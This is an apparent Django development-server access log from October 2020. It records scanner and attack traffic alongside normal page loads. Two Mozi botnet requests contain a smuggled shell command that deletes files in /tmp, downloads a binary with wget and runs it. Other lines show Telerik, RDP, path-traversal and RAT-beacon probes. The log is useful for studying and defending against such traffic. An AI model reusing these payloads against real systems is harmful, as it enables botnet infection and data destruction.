[21/Oct/2020 05:11:12] "\xba\xabd\xa1EZC\xdbM\x87\xee^\xfd\xbf9 X\xd4>\x98\xc4<¨¤\xcf \xac\xa09¡Á\x90#8~\x8c\xde\x9dReF\xbf%1Q¨¤\x9d&g\xbb\x82\x95¨ªZP\x80+\x94e\xc3\xe6\x85¡è\x99\x8bl¨º\x88Y\x91\x95\xc4\xc8H\xc7\x93g\xc14FW|\xfb¨®T\xb8\xfd\xcb\xbb)\xe3\xce\xdd\xcd7\x9e\xefP\x8c¡è[V\xfd\x98\xc9l\x82\xf5\xe4\xc1d\x87X¡Â\x9b\xbf¨¨q\x99&\xdb,\xf5\x87¡Á¡§\x97j;\xe3¨º¡ì\xb4¡ã\xad\x8dE\x9b\xaaB\x80)\xa9¨¦\xaf}\x8e\xb8\x99\xef¡§\x8c¨¨\xe2\xd3¨ª)1\x91\xc1\x8f\x88\x8c\x81\xf0\xdb\xa5\x88\x95H\x9bZ\xab\xce\xbf\xf4E%P*\x88KFY6\x9e\xe7::j\xd4\x8a¡§V\x9a\xaa\xab\xaf\xc3&.¨ª[\xc5e\xbe\x8ar¡ì¡ã\x99F¡Â\xe5\xd6\x96\x8cIm+w\xfduU!x\xac¨¨MPy\xc3!2\xa0¨ª\xc0}!Rw\x8e\xc4¨¢\xa0\xaf+\xadKk\xc5¨¤\s\x9c\xbd\xcb" 400 -
[21/Oct/2020 05:17:47] "GET / HTTP/1.1" 200 643
[21/Oct/2020 05:23:05] code 400, message Bad request syntax (';\xfdg\xd8\xd5\xb8U\xae\x1c\xd2\x03\xcb\x82S\xad{Fb&\xf5\xbd\xe5\x9b^\xe5\xdd\\\x9f\xa6\x1f\x97\x8f\xd2\x81\xd5./j\xde\x83\x9c\x9d1\x8d\x1a.\xd9\xc9I\xbd\xf54\xc5¡¤\xa3¡èf\x03!Jehg\xde\xe5\xc9)\xf5\r¨²¨®[\x83\xcfeN¡ÂlH\x14\x9f\xd8\xfb\xbd\xd2p\x81\x1b\xcb\x90:\x99GU\xc5\xfb\x03\xa0\xc7\xd5\xd0\xa3\x98S\xe2\xd0¡ì\xdfr\x00\xf6\xd3m\x0e\xe26\xc5\xb5C]W\xaf%\xb3\xc0\x92\x96¨®(\x97\x83\xd3\xa3-1\x0b')
[21/Oct/2020 05:23:05] ";\xfdg\xd8\xd5\xb8U\xae\xd2\xcb\x82S\xad{Fb&\xf5\xbd\xe5\x9b^\xe5\xdd\\x9f\xa6\x97\x8f\xd2\x81\xd5./j\xde\x83\x9c\x9d1\x8d.\xd9\xc9I\xbd\xf54\xc5¡¤\xa3¡èf!Jehg\xde\xe5\xc9)\xf5¨²¨®[\x83\xcfeN¡ÂlH\x9f\xd8\xfb\xbd\xd2p\x81\xcb\x90:\x99GU\xc5\xfb\xa0\xc7\xd5\xd0\xa3\x98S\xe2\xd0¡ì\xdfr \xf6\xd3m\xe26\xc5\xb5C]W\xaf%\xb3\xc0\x92\x96¨®(\x97\x83\xd3\xa3-1" 400 -
[21/Oct/2020 05:51:38] "HEAD http://123.125.114.144/ HTTP/1.1" 404 179
[21/Oct/2020 06:00:28] "GET http://150.158.7.54/Telerik.Web.UI.WebResource.axd?type%3Drau HTTP/1.1" 404 179
----------------------------------------
Exception happened during processing of request from ('182.254.52.17', 47312)
Traceback (most recent call last):
  File "/usr/lib64/python3.6/socketserver.py", line 654, in process_request_thread
    self.finish_request(request, client_address)
  File "/usr/lib64/python3.6/socketserver.py", line 364, in finish_request
    self.RequestHandlerClass(request, client_address, self)
  File "/usr/lib64/python3.6/socketserver.py", line 724, in __init__
    self.handle()
  File "/data/env/pyweb/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 174, in handle
    self.handle_one_request()
  File "/data/env/pyweb/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
    self.raw_requestline = self.rfile.readline(65537)
  File "/usr/lib64/python3.6/socket.py", line 586, in readinto
    return self._sock.recv_into(b)
ConnectionResetError: [Errno 104] Connection reset by peer
----------------------------------------
[21/Oct/2020 06:08:21] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*¨¤\x00\x00\x00\x00\x00Cookie:')
[21/Oct/2020 06:08:21] "  /*¨¤     Cookie: mstshash=Administr" 400 -
[21/Oct/2020 06:16:01] "GET /shell?cd+/tmp;rm+-rf+*;wget+http://192.168.1.1:8088/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws HTTP/1.1" 200 40
[21/Oct/2020 06:44:39] "POST /api/jsonws/invoke HTTP/1.1" 404 179
[21/Oct/2020 06:44:48] "POST /editBlackAndWhiteList HTTP/1.1" 404 179
[21/Oct/2020 07:10:15] "GET / HTTP/1.0" 200 643
[21/Oct/2020 07:22:38] "GET http://150.158.7.54/ HTTP/1.1" 404 179
----------------------------------------
Exception happened during processing of request from ('116.128.128.41', 52565)
Traceback (most recent call last):
  File "/usr/lib64/python3.6/socketserver.py", line 654, in process_request_thread
    self.finish_request(request, client_address)
  File "/usr/lib64/python3.6/socketserver.py", line 364, in finish_request
    self.RequestHandlerClass(request, client_address, self)
  File "/usr/lib64/python3.6/socketserver.py", line 724, in __init__
    self.handle()
  File "/data/env/pyweb/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 174, in handle
    self.handle_one_request()
  File "/data/env/pyweb/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
    self.raw_requestline = self.rfile.readline(65537)
  File "/usr/lib64/python3.6/socket.py", line 586, in readinto
    return self._sock.recv_into(b)
ConnectionResetError: [Errno 104] Connection reset by peer
----------------------------------------
[21/Oct/2020 07:41:42] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*¨¤\x00\x00\x00\x00\x00Cookie:')
[21/Oct/2020 07:41:42] "  /*¨¤     Cookie: mstshash=Administr" 400 -
[21/Oct/2020 08:23:01] "GET / HTTP/1.1" 200 643
[21/Oct/2020 08:59:46] "GET / HTTP/1.0" 200 643
[21/Oct/2020 10:25:56] code 400, message Bad request version ('HTTP')
[21/Oct/2020 10:25:56] "GET ../../proc/ HTTP" 400 -
[21/Oct/2020 10:32:40] "HEAD http://112.124.42.80:63435/ HTTP/1.1" 404 179
[21/Oct/2020 10:33:08] "GET /shell?cd+/tmp;rm+-rf+*;wget+http://192.168.1.1:8088/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws HTTP/1.1" 200 40
[21/Oct/2020 10:54:21] "POST /editBlackAndWhiteList HTTP/1.1" 404 179
[21/Oct/2020 11:16:19] "HEAD http://123.125.114.144/ HTTP/1.1" 404 179
[21/Oct/2020 11:41:09] "GET / HTTP/1.1" 200 643
[21/Oct/2020 12:13:33] "GET / HTTP/1.1" 200 643
[21/Oct/2020 13:01:07] "GET / HTTP/1.1" 200 643
[21/Oct/2020 13:55:35] "GET http://150.158.7.54/ HTTP/1.1" 404 179
----------------------------------------
Exception happened during processing of request from ('182.254.52.17', 65193)
Traceback (most recent call last):
  File "/usr/lib64/python3.6/socketserver.py", line 654, in process_request_thread
    self.finish_request(request, client_address)
  File "/usr/lib64/python3.6/socketserver.py", line 364, in finish_request
    self.RequestHandlerClass(request, client_address, self)
  File "/usr/lib64/python3.6/socketserver.py", line 724, in __init__
    self.handle()
  File "/data/env/pyweb/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 174, in handle
    self.handle_one_request()
  File "/data/env/pyweb/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
    self.raw_requestline = self.rfile.readline(65537)
  File "/usr/lib64/python3.6/socket.py", line 586, in readinto
    return self._sock.recv_into(b)
ConnectionResetError: [Errno 104] Connection reset by peer
----------------------------------------
[21/Oct/2020 14:05:55] code 400, message Bad request syntax ("145.ll|'|'|SGFjS2VkX0Q0OTkwNjI3|'|'|WIN-JNAPIER0859|'|'|JNapier|'|'|19-02-01|'|'||'|'|Win 7 Professional SP1 x64|'|'|No|'|'|0.7d|'|'|..|'|'|AA==|'|'|112.inf|'|'|SGFjS2VkDQoxOTIuMTY4LjkyLjIyMjo1NTUyDQpEZXNrdG9wDQpjbGllbnRhLmV4ZQ0KRmFsc2UNCkZhbHNlDQpUcnVlDQpGYWxzZQ==12.act|'|'|AA==")
[21/Oct/2020 14:05:55] "145.ll|'|'|SGFjS2VkX0Q0OTkwNjI3|'|'|WIN-JNAPIER0859|'|'|JNapier|'|'|19-02-01|'|'||'|'|Win 7 Professional SP1 x64|'|'|No|'|'|0.7d|'|'|..|'|'|AA==|'|'|112.inf|'|'|SGFjS2VkDQoxOTIuMTY4LjkyLjIyMjo1NTUyDQpEZXNrdG9wDQpjbGllbnRhLmV4ZQ0KRmFsc2UNCkZhbHNlDQpUcnVlDQpGYWxzZQ==12.act|'|'|AA==" 400 -
[21/Oct/2020 14:38:49] "GET / HTTP/1.1" 200 643
[21/Oct/2020 14:44:36] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*¨¤\x00\x00\x00\x00\x00Cookie:')
[21/Oct/2020 14:44:36] "  /*¨¤     Cookie: mstshash=Administr" 400 -
[21/Oct/2020 15:06:55] "GET /portal/redlion HTTP/1.1" 404 179
[21/Oct/2020 15:21:22] "POST /editBlackAndWhiteList HTTP/1.1" 404 179
[21/Oct/2020 16:19:27] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*¨¤\x00\x00\x00\x00\x00Cookie:')
[21/Oct/2020 16:19:27] "  /*¨¤     Cookie: mstshash=Administr" 400 -
[21/Oct/2020 16:34:13] "GET / HTTP/1.0" 200 643
[21/Oct/2020 16:48:47] "GET / HTTP/1.0" 200 643
[21/Oct/2020 17:13:35] "GET / HTTP/1.1" 200 643
[21/Oct/2020 17:41:16] "GET / HTTP/1.1" 200 643
[21/Oct/2020 17:45:16] "GET / HTTP/1.1" 200 643
[21/Oct/2020 17:45:16] "GET /favicon.ico HTTP/1.1" 404 179
[21/Oct/2020 17:45:18] "GET /welcome/ HTTP/1.1" 200 883
[21/Oct/2020 17:45:19] "GET /static/images/Samurai%20Champloo%20ED%2004.jpg HTTP/1.1" 200 202660
